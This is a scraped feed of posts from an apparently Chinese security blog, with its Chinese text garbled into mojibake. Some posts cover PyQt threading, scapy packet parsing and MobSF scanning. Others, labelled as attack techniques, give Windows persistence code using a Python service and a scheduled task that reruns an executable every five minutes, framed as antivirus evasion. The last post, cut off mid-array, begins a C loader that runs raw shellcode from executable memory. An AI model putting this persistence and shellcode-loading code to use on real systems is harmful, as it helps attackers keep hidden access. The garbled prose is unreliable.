&lt;p>pyqtæ ¸å¿ƒå°±æ˜¯ä¿¡å·å’Œæ§½ï¼Œç”¨æ¥ä¼ é€’æŒ‡ä»¤å’Œæ‰§è¡ŒæŒ‡ä»¤&lt;/p>
&lt;p>æ§ä»¶æœ‰å¾ˆå¤šå±æ€§ï¼Œæ¯”å¦‚è¯´æŒ‰é’®è¢«ç‚¹å‡»ï¼Œç‚¹å‡»å°±æ˜¯ä¸€ç§ä¿¡å·ï¼Œå¯ä»¥è¿æ¥æ§½å‡½æ•°æ¥æ‰§è¡Œå†…å®¹&lt;/p>
&lt;p>è¿™æ˜¯ä¸€ä¸ªä¿¡å·è¿æ¥ä¸€ä¸ªæ§½è¿æ¥çš„ä¾‹å­&lt;/p>
&lt;p>è¿˜æœ‰å¤šä¸ªä¿¡å·è¿æ¥ä¸€ä¸ªæ§½ã€ä¿¡å·è¿æ¥ä¿¡å·ã€ä¸€ä¸ªä¿¡å·è¿æ¥å¤šä¸ªæ§½ã€è‡ªå®šä¹‰ä¿¡å·&lt;/p>
&lt;pre tabindex="0">&lt;code>import sys
from PyQt5.QtWidgets import QApplication, QWidget, QPushButton
class Demo(QWidget): # 1
def __init__(self):
super(Demo, self).__init__()
self.button = QPushButton(&amp;#39;Start&amp;#39;, self) # 2
self.button.clicked.connect(self.change_text) # 3
def change_text(self):
print(&amp;#39;change text&amp;#39;)
self.button.setText(&amp;#39;Stop&amp;#39;) # 4
self.button.clicked.disconnect(self.change_text) # 5
if __name__ == &amp;#39;__main__&amp;#39;:
app = QApplication(sys.argv)
demo = Demo() # 6
demo.show() # 7
sys.exit(app.exec_())
&lt;/code>&lt;/pre>&lt;h2 id="åœ¨çº¿ç¨‹ä¸­è·å–çª—å£å†…å®¹">åœ¨çº¿ç¨‹ä¸­è·å–çª—å£å†…å®¹&lt;/h2>
&lt;p>uiçº¿ç¨‹åªèƒ½ç”¨æ¥è·‘uiï¼Œè¦æ‰§è¡Œä¸šåŠ¡é€»è¾‘å¾—å¤šå¼€ä¸€ä¸ªçº¿ç¨‹ï¼Œé˜²æ­¢çª—å£é˜»å¡&lt;/p>
&lt;p>è·å–è¾“å…¥æ¡†çš„å†…å®¹&lt;/p>
&lt;pre tabindex="0">&lt;code>import sys
from PyQt5.QtCore import QThread
from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QLineEdit, QLabel, QVBoxLayout, QHBoxLayout
class Demo(QWidget):
def __init__(self):
super(Demo, self).__init__()
self.line = QLineEdit()
self.btn = QPushButton(&amp;#39;å¼€å§‹çˆ¬å–&amp;#39;)
self.btn.clicked.connect(self.start_slot)
h_layout = QHBoxLayout()
v_layout = QVBoxLayout()
h_layout.addWidget(QLabel(&amp;#39;ç½‘å€ï¼š&amp;#39;))
h_layout.addWidget(self.line)
v_layout.addLayout(h_layout)
v_layout.addWidget(self.btn)
self.setLayout(v_layout)
self.crawl_thread = CrawlThread(self) # 1
def start_slot(self): # 2
self.crawl_thread.start()
class CrawlThread(QThread):
def __init__(self, demo): # 3
super(CrawlThread, self).__init__()
self.demo = demo
def run(self): # 4
url = self.demo.line.text().strip()
print(f&amp;#39;è¦çˆ¬å–çš„ç½‘å€ä¸ºï¼š{url}&amp;#39;)
if __name__ == &amp;#39;__main__&amp;#39;:
app = QApplication(sys.argv)
demo = Demo()
demo.show()
sys.exit(app.exec_())
&lt;/code>&lt;/pre>&lt;ol>
&lt;li>
&lt;p>å®ä¾‹åŒ–çº¿ç¨‹ï¼Œæ³¨æ„æ­¤æ—¶æˆ‘ä»¬éœ€è¦æŠŠå½“å‰çª—å£ç±»å®ä¾‹(ä¹Ÿå°±æ˜¯self)ä¼ å…¥ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æŒ‰é’®æ‰€è¿æ¥çš„æ§½å‡½æ•°ç”¨æ¥å¯åŠ¨çº¿ç¨‹ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç»™çº¿ç¨‹çš„åˆå§‹åŒ–å‡½æ•°æ·»åŠ ä¸€ä¸ªå‚æ•°ï¼Œç”¨æ¥è·å–çª—å£ç±»å®ä¾‹ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ¥ç€æˆ‘ä»¬å°±å¯ä»¥åœ¨runå‡½æ•°ä¸­è·å–çª—å£ä¸Šä»»ä½•ä¸€ä¸ªæ§ä»¶åŠå…¶å†…å®¹äº†ã€‚&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="å­çº¿ç¨‹æ•°æ®è¾“å…¥åˆ°æ§ä»¶">å­çº¿ç¨‹æ•°æ®è¾“å…¥åˆ°æ§ä»¶&lt;/h2>
&lt;p>è¿™é‡Œå‘èµ·è¯·æ±‚åŒ…çš„å­çº¿ç¨‹çš„è¿”å›å€¼è¾“å‡ºåˆ°textbrowseræ§ä»¶ä¸Šï¼Œtxetbrowserå°±å˜æˆä¸€ä¸ªæ‰“å°æ—¥å¿—çš„æ¡†&lt;/p>
&lt;p>ç”¨åˆ°äº†è‡ªå®šä¹‰ä¿¡å·æ¥å®ç°çº¿ç¨‹é—´é€šä¿¡&lt;/p>
&lt;pre tabindex="0">&lt;code>import sys
from PyQt5.QtWidgets import QApplication, QWidget
from destination import Ui_Form
import requests
from PyQt5.QtCore import Qt, QThread, pyqtSignal
class Demo(QWidget, Ui_Form):
def __init__(self):
super(Demo, self).__init__()
self.setupUi(self)
self.pushButton.clicked.connect(self.login)
self.my_thread = MyThread(self) # 1
self.my_thread.child_signal.connect(self.log) # 2
def log(self, msg): # 5
self.textBrowser.append(msg)
# self.textBrowser.setText(msg)
def login(self):
self.my_thread.start()
class MyThread(QThread):
child_signal = pyqtSignal(str) # 3
def __init__(self, demo):
super(MyThread, self).__init__()
self.demo = demo
def buy(self):
print(&amp;#39;buy&amp;#39;)
def run(self):
# phone = self.demo.textEdit.toPlainText()
# print(phone)
while 1:
res=requests.get(&amp;#34;http://www.baidu.com&amp;#34;)
# self.demo.textBrowser.setText(phone)
# self.sig.emit(phone)
self.child_signal.emit(res.text) # 4
class Send(QThread):
pass
if __name__ == &amp;#39;__main__&amp;#39;:
app = QApplication(sys.argv)
demo = Demo()
demo.show()
sys.exit(app.exec_())
&lt;/code>&lt;/pre>&lt;ol>
&lt;li>å®ä¾‹åŒ–çº¿ç¨‹å¯¹è±¡&lt;/li>
&lt;li>çº¿ç¨‹è‡ªå®šä¹‰ä¿¡å·è¿æ¥æ§½å‡½æ•°&lt;/li>
&lt;li>è‡ªå®šä¹‰ä¿¡å·å¯¹è±¡ï¼Œstrè¡¨ç¤ºè¿™ä¸ªä¿¡å·å¯ä»¥ä¼ é€’ä¸€ä¸ªå‚æ•°&lt;/li>
&lt;li>è‡ªå®šä¹‰ä¿¡å·å°†ç»“æœå‘å°„å‡ºå»&lt;/li>
&lt;li>ç»“æœä¼ é€’ç»™æ§½å‡½æ•°&lt;/li>
&lt;/ol></content><category scheme="https://if1sh.com/tags/gui/" term="gui" label="gui"/></entry><entry><title type="text">scapyæµé‡åˆ†æ</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/scapy%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/><id>https://if1sh.com/posts/scapy%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-03-24T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">scapyæµé‡åˆ†æ å…³äºæµé‡åˆ†æï¼Œåœ¨æŸäº›ä¸Šäº†æ‰‹æ®µçš„åœºæ™¯ï¼Œä¸»åŠ¨æˆ–è€…è¢«åŠ¨è·å–åˆ°äº†æµé‡ï¼Œè¿™ä¸ªâ€¦â€¦</summary><content type="html">&lt;h1 id="scapyæµé‡åˆ†æ">scapyæµé‡åˆ†æ&lt;/h1>
&lt;p>å…³äºæµé‡åˆ†æï¼Œåœ¨æŸäº›ä¸Šäº†æ‰‹æ®µçš„åœºæ™¯ï¼Œä¸»åŠ¨æˆ–è€…è¢«åŠ¨è·å–åˆ°äº†æµé‡ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ç”¨æ¥å¨èƒçŒæ€ï¼Œæå‡ºä½ æƒ³è¦çš„ä¿¡æ¯&lt;/p>
&lt;p>scapyå°±æ˜¯è¿™æ ·ä¸€ä¸ªé€‚åˆå•å…µä½œæˆ˜çš„åº“ï¼Œä½†æ˜¯å¦‚æœæœ‰esä¹‹ç±»çš„æµé‡åˆ†æå¹³å°å°±æ›´å¥½ä¸è¿‡äº†ï¼Œä»–ä»¬æŠŠåˆ†å±‚è§„åˆ™éƒ½å†™å¥½äº†ï¼Œè€Œä¸”æœç´¢é€Ÿåº¦æå¿«&lt;/p>
&lt;pre tabindex="0">&lt;code>rdpcap()ï¼šè¯»å–pcapæ–‡ä»¶
show()ï¼šå±•ç¤ºå½“å‰ç±»å‹åŒ…å«çš„å±æ€§åŠå€¼
haslayer()ï¼šåˆ¤æ–­å½“å‰æµæ˜¯å¦å«æœ‰æŸå±‚æ•°æ®
getlayer()ï¼šæ ¹æ®æ¡ä»¶è·å–æ•°æ®
http_request = p[HTTPRequest].fields ç›´æ¥è·å–æå–å¥½çš„å­—å…¸å½¢å¼çš„httpæ•°æ®ç”¨fields
è¿˜æœ‰ä¸€ä¸ªå±æ€§payloadå¯ä»¥ä¸æ–­è¿›ä¸‹ä¸€ä¸ªå±‚
æ¯”å¦‚ç°åœ¨æœ‰å››ä¸ªå±‚ Ether,IP,TCP,RAW
IP å¯ä»¥è¡¨ç¤ºä¸ºp.payload, æƒ³è¦IPå±‚çš„srcå¯ä»¥ç”¨p.payload.src
&lt;/code>&lt;/pre>&lt;h2 id="demo">demo&lt;/h2>
&lt;p>scapyä¸»è¦æ˜¯åˆ†ä¸ºEthernetã€IPã€TCPã€Rawè¿™å››å±‚ï¼Œæ¯ä¸€å±‚éƒ½æœ‰æ¯ä¸€å±‚çš„å…³é”®å­—ï¼Œå¯ä»¥åˆ©ç”¨é”®å€¼å¯¹çš„æ–¹å¼ç›´æ¥è¯»å–ç›¸åº”çš„å†…å®¹ã€‚&lt;/p>
&lt;pre tabindex="0">&lt;code>import scapy_http.http
try:
import scapy.all as scapy
except ImportError:
import scapy
def parse_http_pcap(pcap_path):
pcap_infos = list()
packets = scapy.rdpcap(pcap_path)
for p in packets:
print &amp;#34;----&amp;#34;
# åˆ¤æ–­æ˜¯å¦åŒ…å«æŸä¸€å±‚ï¼Œç”¨haslayer
if p.haslayer(&amp;#34;IP&amp;#34;):
src_ip = p[&amp;#34;IP&amp;#34;].src
dst_ip = p[&amp;#34;IP&amp;#34;].dst
print &amp;#34;sip: %s&amp;#34; % src_ip
print &amp;#34;dip: %s&amp;#34; % dst_ip
if p.haslayer(&amp;#34;TCP&amp;#34;):
# è·å–æŸä¸€å±‚çš„åŸå§‹è´Ÿè½½ç”¨.payload.original
raw_http = p[&amp;#34;TCP&amp;#34;].payload.original
sport = p[&amp;#34;TCP&amp;#34;].sport
dport = p[&amp;#34;TCP&amp;#34;].dport
print &amp;#34;sport: %s&amp;#34; % sport
print &amp;#34;dport: %s&amp;#34; % dport
print &amp;#34;raw_http:\n%s&amp;#34; % raw_http
if p.haslayer(&amp;#34;HTTPRequest&amp;#34;):
host = p[&amp;#34;HTTPRequest&amp;#34;].Host
uri = p[&amp;#34;HTTPRequest&amp;#34;].Path
# ç›´æ¥è·å–æå–å¥½çš„å­—å…¸å½¢å¼çš„httpæ•°æ®ç”¨fields
http_fields = p[&amp;#34;HTTPRequest&amp;#34;].fields
http_payload = p[&amp;#34;HTTPRequest&amp;#34;].payload.fields
print &amp;#34;host: %s&amp;#34; % host
print &amp;#34;uri: %s&amp;#34; % uri
print &amp;#34;http_fields:\n%s&amp;#34; % http_fields
print &amp;#34;http_payload:\n%s&amp;#34; % http_payload
parse_http_pcap(&amp;#34;test.pcap&amp;#34;)
&lt;/code>&lt;/pre>&lt;h2 id="å‚è€ƒ">å‚è€ƒ&lt;/h2>
&lt;p>&lt;a href="https://www.jianshu.com/p/805075ca9d53">https://www.jianshu.com/p/805075ca9d53&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.csdn.net/Yuberhu/article/details/64123516">https://blog.csdn.net/Yuberhu/article/details/64123516&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/17bdw/p/10562213.html#_label4">https://www.cnblogs.com/17bdw/p/10562213.html#_label4&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.xmanblog.net/python-pcap/">https://www.xmanblog.net/python-pcap/&lt;/a>&lt;/p></content><category scheme="https://if1sh.com/categories/%E9%98%B2/" term="é˜²" label="é˜²"/><category scheme="https://if1sh.com/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" term="æµé‡åˆ†æ" label="æµé‡åˆ†æ"/><category scheme="https://if1sh.com/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" term="æµé‡åˆ†æ" label="æµé‡åˆ†æ"/></entry><entry><title type="text">æƒé™ç»´æŒ-pyæœåŠ¡</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E6%9C%8D%E5%8A%A1/"/><id>https://if1sh.com/posts/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E6%9C%8D%E5%8A%A1/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-03-18T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">æƒé™ç»´æŒ-pyæœåŠ¡ # encoding=utf-8 import win32serviceutil import win32service import win32event import os import logging import inspect class PySerTest(win32serviceutil.ServiceFramework): _svc_name_ = &amp;#34;PySerTest&amp;#34; _svc_display_name_ = &amp;#34;Py Service Test&amp;#34; # æœåŠ¡æ˜¾ç¤ºçš„åç§°ï¼Œâ€¦â€¦</summary><content type="html">&lt;h1 id="æƒé™ç»´æŒ-pyæœåŠ¡">æƒé™ç»´æŒ-pyæœåŠ¡&lt;/h1>
&lt;pre tabindex="0">&lt;code># encoding=utf-8
import win32serviceutil
import win32service
import win32event
import os
import logging
import inspect
class PySerTest(win32serviceutil.ServiceFramework):
_svc_name_ = &amp;#34;PySerTest&amp;#34;
_svc_display_name_ = &amp;#34;Py Service Test&amp;#34; # æœåŠ¡æ˜¾ç¤ºçš„åç§°ï¼Œå¯ä»¥è‡ªå·±ä¿®æ”¹
_svc_description_ = &amp;#34;This is a python service test code &amp;#34; # æœåŠ¡æ˜¾ç¤ºçš„æè¿°
def __init__(self, args):
win32serviceutil.ServiceFramework.__init__(self, args)
self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
self.logger = self._getLogger()
self.run = True
def _getLogger(self):
logger = logging.getLogger(&amp;#39;[PythonService]&amp;#39;)
this_file = inspect.getfile(inspect.currentframe())
dirpath = os.path.abspath(os.path.dirname(this_file))
# handler = logging.FileHandler(os.path.join(dirpath, &amp;#34;service.log&amp;#34;))
handler = logging.FileHandler(&amp;#34;c:\\service.log&amp;#34;)
formatter = logging.Formatter(&amp;#39;%(asctime)s %(name)-12s %(levelname)-8s %(message)s&amp;#39;)
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.INFO)
return logger
def SvcDoRun(self):
# åœ¨æ­¤ç¼–å†™è‡ªå·±çš„ä¸šåŠ¡ç¨‹åº
import time
self.logger.info(&amp;#34;service is run....&amp;#34;)
while self.run:
self.logger.info(&amp;#34;I am runing....&amp;#34;)
time.sleep(2)
def SvcStop(self):
self.logger.info(&amp;#34;service is stop....&amp;#34;)
self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
win32event.SetEvent(self.hWaitStop)
self.ReportServiceStatus(win32service.SERVICE_STOPPED)
self.run = False
if __name__ == &amp;#39;__main__&amp;#39;:
# win32serviceutil.HandleCommandLine(PythonService)
import sys
import servicemanager
if len(sys.argv) == 1:
try:
evtsrc_dll = os.path.abspath(servicemanager.__file__)
servicemanager.PrepareToHostSingle(PySerTest) # å¦‚æœä¿®æ”¹è¿‡åå­—ï¼Œåå­—è¦ç»Ÿä¸€
servicemanager.Initialize(&amp;#39;PySerTest&amp;#39;, evtsrc_dll) # å¦‚æœä¿®æ”¹è¿‡åå­—ï¼Œåå­—è¦ç»Ÿä¸€
servicemanager.StartServiceCtrlDispatcher()
except win32service.error as details:
import winerror
if details == winerror.ERROR_FAILED_SERVICE_CONTROLLER_CONNECT:
win32serviceutil.usage()
else:
win32serviceutil.HandleCommandLine(PySerTest) # å¦‚æœä¿®æ”¹è¿‡åå­—ï¼Œåå­—è¦ç»Ÿä¸€
&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%94%BB/" term="æ”»" label="æ”»"/><category scheme="https://if1sh.com/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" term="æƒé™ç»´æŒ" label="æƒé™ç»´æŒ"/><category scheme="https://if1sh.com/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" term="æƒé™ç»´æŒ" label="æƒé™ç»´æŒ"/></entry><entry><title type="text">æƒé™ç»´æŒ-pyè®¡åˆ’ä»»åŠ¡</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/"/><id>https://if1sh.com/posts/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-py%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-03-14T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">æƒé™ç»´æŒ-pyè®¡åˆ’ä»»åŠ¡ åº•å±‚è¿˜æ˜¯è°ƒç”¨api,comç©æ¥ç©å» çºµè§‚å†å²,ä»æ— éå°±æ˜¯ä»vb,â€¦â€¦</summary><content type="html">&lt;h1 id="æƒé™ç»´æŒ-pyè®¡åˆ’ä»»åŠ¡">æƒé™ç»´æŒ-pyè®¡åˆ’ä»»åŠ¡&lt;/h1>
&lt;p>åº•å±‚è¿˜æ˜¯è°ƒç”¨api,comç©æ¥ç©å»&lt;/p>
&lt;p>çºµè§‚å†å²,ä»æ— éå°±æ˜¯ä»vb,powershell,c#,ä»¥åŠåé¢çš„å„ç±»å°ä¼—è¯­è¨€æ¼”å˜å‡ºæ¥çš„è°ƒç”¨apiçš„ç»´æƒ&lt;/p>
&lt;p>ç»´æƒçš„æ‰‹æ®µå°±æ˜¯å°†ç°æœ‰çš„å¯ç”¨æƒé™ç»´æŒçš„æ­£å¸¸æœåŠ¡,åœ¨ç”¨åº•å±‚é‡å†™ä¸€ä¸‹,ç”¨ä»¥å…æ€&lt;/p>
&lt;pre tabindex="0">&lt;code>import datetime
import win32com.client
# create com
scheduler = win32com.client.Dispatch(&amp;#39;Schedule.Service&amp;#39;)
scheduler.Connect()
root_folder = scheduler.GetFolder(&amp;#39;\\&amp;#39;)
task_def = scheduler.NewTask(0)
# Create trigger
start_time = datetime.datetime.now() + datetime.timedelta(minutes=5)
TASK_TRIGGER_TIME = 1
TASK_IIdleTrigger = 6
trigger = task_def.Triggers.Create(TASK_IIdleTrigger)
trigger.Repetition.Interval = &amp;#34;PT5M&amp;#34; # æ¯5åˆ†é’Ÿå¾ªç¯æ‰§è¡Œä¸€æ¬¡
trigger.Enabled = True
trigger.StartBoundary = start_time.isoformat()
# Create action
TASK_ACTION_EXEC = 0
action = task_def.Actions.Create(TASK_ACTION_EXEC)
action.ID = &amp;#39;DO NOTHING&amp;#39;
action.Path = &amp;#34;C:\\Users\\ifish\\Desktop\\flash_cn.exe&amp;#34;
# action.Arguments = &amp;#39;/c &amp;#34;exit&amp;#34;&amp;#39;
# Set parameters
task_def.RegistrationInfo.Description = &amp;#39;Test Task&amp;#39;
task_def.Settings.Enabled = True
task_def.Settings.StopIfGoingOnBatteries = False
# Register task
# If task already exists, it will be updated
TASK_CREATE_OR_UPDATE = 6
TASK_LOGON_NONE = 0
root_folder.RegisterTaskDefinition(
&amp;#39;Test Task&amp;#39;, # Task name
task_def,
TASK_CREATE_OR_UPDATE,
&amp;#39;&amp;#39;, # No user
&amp;#39;&amp;#39;, # No password
TASK_LOGON_NONE)
&lt;/code>&lt;/pre></content><category scheme="https://if1sh.com/categories/%E6%94%BB/" term="æ”»" label="æ”»"/><category scheme="https://if1sh.com/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" term="æƒé™ç»´æŒ" label="æƒé™ç»´æŒ"/><category scheme="https://if1sh.com/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" term="æƒé™ç»´æŒ" label="æƒé™ç»´æŒ"/></entry><entry><title type="text">mobsf apiè°ƒè¯•</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/mobsf-api%E8%B0%83%E8%AF%95/"/><id>https://if1sh.com/posts/mobsf-api%E8%B0%83%E8%AF%95/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-03-12T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">mobsf apiè°ƒè¯• mobsf å¹³å°éœ€è¦æ¥å…¥ç§»åŠ¨ç«¯æ‰«æ,äºæ˜¯é€‰ç”¨äº†mobsf æŸ¥é˜…mobsfçš„æºç ,å¾—çŸ¥â€¦â€¦</summary><content type="html">&lt;h1 id="mobsf-apiè°ƒè¯•">mobsf apiè°ƒè¯•&lt;/h1>
&lt;h2 id="mobsf">mobsf&lt;/h2>
&lt;p>å¹³å°éœ€è¦æ¥å…¥ç§»åŠ¨ç«¯æ‰«æ,äºæ˜¯é€‰ç”¨äº†mobsf&lt;/p>
&lt;p>æŸ¥é˜…mobsfçš„æºç ,å¾—çŸ¥å®ƒçš„é™æ€æ‰«æä¹Ÿæ˜¯é€šè¿‡ä½¿ç”¨æ­£åˆ™æ¥åŒ¹é…æ•æ„Ÿä¿¡æ¯,é™æ€æ‰«æè¯¯æŠ¥è¿˜æ˜¯æŒºå¤šçš„&lt;/p>
&lt;p>ä»¥ä¸‹ç”¨æ¥æµ‹è¯•mobsfæ¥å£&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#34;&amp;#34;&amp;#34;
MOBSF REST API Python Requests
&amp;#34;&amp;#34;&amp;#34;
import json
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
SERVER = &amp;#34;http://127.0.0.1:8000&amp;#34;
FILE = &amp;#39;diva-beta.apk&amp;#39;
APIKEY = &amp;#39;&amp;lt;API_KEY&amp;gt;&amp;#39;
def upload():
&amp;#34;&amp;#34;&amp;#34;Upload File&amp;#34;&amp;#34;&amp;#34;
print(&amp;#34;Uploading file&amp;#34;)
multipart_data = MultipartEncoder(fields={&amp;#39;file&amp;#39;: (FILE, open(FILE, &amp;#39;rb&amp;#39;), &amp;#39;application/octet-stream&amp;#39;)})
headers = {&amp;#39;Content-Type&amp;#39;: multipart_data.content_type, &amp;#39;Authorization&amp;#39;: APIKEY}
response = requests.post(SERVER + &amp;#39;/api/v1/upload&amp;#39;, data=multipart_data, headers=headers)
print(response.text)
return response.text
def scan(data):
&amp;#34;&amp;#34;&amp;#34;Scan the file&amp;#34;&amp;#34;&amp;#34;
print(&amp;#34;Scanning file&amp;#34;)
post_dict = json.loads(data)
headers = {&amp;#39;Authorization&amp;#39;: APIKEY}
response = requests.post(SERVER + &amp;#39;/api/v1/scan&amp;#39;, data=post_dict, headers=headers)
print(response.text)
def pdf(data):
&amp;#34;&amp;#34;&amp;#34;Generate PDF Report&amp;#34;&amp;#34;&amp;#34;
print(&amp;#34;Generate PDF report&amp;#34;)
headers = {&amp;#39;Authorization&amp;#39;: APIKEY}
data = {&amp;#34;hash&amp;#34;: json.loads(data)[&amp;#34;hash&amp;#34;]}
response = requests.post(SERVER + &amp;#39;/api/v1/download_pdf&amp;#39;, data=data, headers=headers, stream=True)
with open(&amp;#34;report.pdf&amp;#34;, &amp;#39;wb&amp;#39;) as flip:
for chunk in response.iter_content(chunk_size=1024):
if chunk:
flip.write(chunk)
print(&amp;#34;Report saved as report.pdf&amp;#34;)
def json_resp(data):
&amp;#34;&amp;#34;&amp;#34;Generate JSON Report&amp;#34;&amp;#34;&amp;#34;
print(&amp;#34;Generate JSON report&amp;#34;)
headers = {&amp;#39;Authorization&amp;#39;: APIKEY}
data = {&amp;#34;hash&amp;#34;: json.loads(data)[&amp;#34;hash&amp;#34;]}
response = requests.post(SERVER + &amp;#39;/api/v1/report_json&amp;#39;, data=data, headers=headers)
print(response.text)
def delete(data):
&amp;#34;&amp;#34;&amp;#34;Delete Scan Result&amp;#34;&amp;#34;&amp;#34;
print(&amp;#34;Deleting Scan&amp;#34;)
headers = {&amp;#39;Authorization&amp;#39;: APIKEY}
data = {&amp;#34;hash&amp;#34;: json.loads(data)[&amp;#34;hash&amp;#34;]}
response = requests.post(SERVER + &amp;#39;/api/v1/delete_scan&amp;#39;, data=data, headers=headers)
print(response.text)
RESP = upload()
scan(RESP)
json_resp(RESP)
pdf(RESP)
delete(RESP)
&lt;/code>&lt;/pre>&lt;h2 id="æ¥æº">æ¥æº&lt;/h2>
&lt;p>&lt;a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">https://github.com/MobSF/Mobile-Security-Framework-MobSF&lt;/a>&lt;/p></content><category scheme="https://if1sh.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" term="ç§»åŠ¨å®‰å…¨" label="ç§»åŠ¨å®‰å…¨"/><category scheme="https://if1sh.com/tags/app%E6%89%AB%E6%8F%8F/" term="appæ‰«æ" label="appæ‰«æ"/></entry><entry><title type="text">c shellcode callback function</title><link rel="alternate" type="text/html" href="https://if1sh.com/posts/c-shellcode-callback-function/"/><id>https://if1sh.com/posts/c-shellcode-callback-function/</id><updated>2023-01-01T18:53:09+08:00</updated><published>2022-02-24T00:00:00+00:00</published><author><name>ifish</name><uri>https://ifish.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">c shellcode callback function EnumChildWindows.cpp //#include &amp;#34;stdafx.h&amp;#34; #include &amp;lt;Windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; int main() { char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34; &amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34; &amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34; &amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34; &amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34; &amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34; &amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34; &amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34; &amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34; &amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34; &amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34; &amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34; &amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34; &amp;#34;\x53\x53\x53\x53\x52\x53\xff\xd7&amp;#34;; HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(hAlloc, shellcode,â€¦â€¦</summary><content type="html">&lt;h1 id="c-shellcode-callback-function">c shellcode callback function&lt;/h1>
&lt;h2 id="enumchildwindowscpp">EnumChildWindows.cpp&lt;/h2>
&lt;pre tabindex="0">&lt;code>//#include &amp;#34;stdafx.h&amp;#34;
#include &amp;lt;Windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
int main()
{
char shellcode[] = &amp;#34;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&amp;#34;
&amp;#34;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&amp;#34;
&amp;#34;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&amp;#34;
&amp;#34;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&amp;#34;
&amp;#34;\x57\x78\x01\xc2\x8b\x7a\x20\x01&amp;#34;
&amp;#34;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&amp;#34;
&amp;#34;\x45\x81\x3e\x43\x72\x65\x61\x75&amp;#34;
&amp;#34;\xf2\x81\x7e\x08\x6f\x63\x65\x73&amp;#34;
&amp;#34;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&amp;#34;
&amp;#34;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&amp;#34;
&amp;#34;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&amp;#34;
&amp;#34;\xb1\xff\x53\xe2\xfd\x68\x63\x61&amp;#34;
&amp;#34;\x6c\x63\x89\xe2\x52\x52\x53\x53&amp;#34;
